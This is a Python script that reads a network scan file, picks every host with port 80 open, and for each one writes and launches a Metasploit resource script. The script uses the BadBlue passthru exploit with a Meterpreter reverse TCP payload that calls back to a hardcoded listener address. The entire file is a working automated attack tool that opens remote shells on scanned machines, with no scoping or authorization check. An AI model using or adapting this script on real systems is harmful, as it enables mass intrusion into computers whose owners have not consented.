import os
import subprocess

# Function to parse the network scan output
def parse_scan_output(file_path):
    with open(file_path, 'r') as file:
        lines = file.readlines()
    
    targets = []
    current_ip = None
    
    for line in lines:
        if line.startswith('Host:'):
            current_ip = line.split()[1]
        elif line.startswith('Port: 80') and 'State: open' in line:
            if current_ip:
                targets.append(current_ip)
    
    return targets

# Function to create the Metasploit resource script
def create_rc_file(ip_address, rc_file_path):
    rc_content = f"""
use exploit/windows/http/badblue_passthru
set RHOST {ip_address}
set LHOST 192.168.29.229  # Change this to the attacker's IP address
set LPORT 5555
set payload windows/meterpreter/reverse_tcp
exploit
"""
    with open(rc_file_path, 'w') as rc_file:
        rc_file.write(rc_content)
    print(f"Resource script for {ip_address} created at {rc_file_path}")

# Function to run the Metasploit resource script
def run_msfconsole(rc_file_path):
    try:
        subprocess.run(['msfconsole', '-r', rc_file_path], check=True)
    except subprocess.CalledProcessError as e:
        print(f"Failed to run msfconsole: {e}")

# Main function
def main(scan_output_path):
    targets = parse_scan_output(scan_output_path)
    
    if not targets:
        print("No targets found with port 80 open.")
        return
    
    for ip in targets:
        rc_file_path = f"badblue_exploit_{ip}.rc"
        create_rc_file(ip, rc_file_path)
        run_msfconsole(rc_file_path)

# Run the main function
if __name__ == "__main__":
    scan_output_path = "scan_output.txt"  # Change this to the path of your scan output file
    main(scan_output_path)
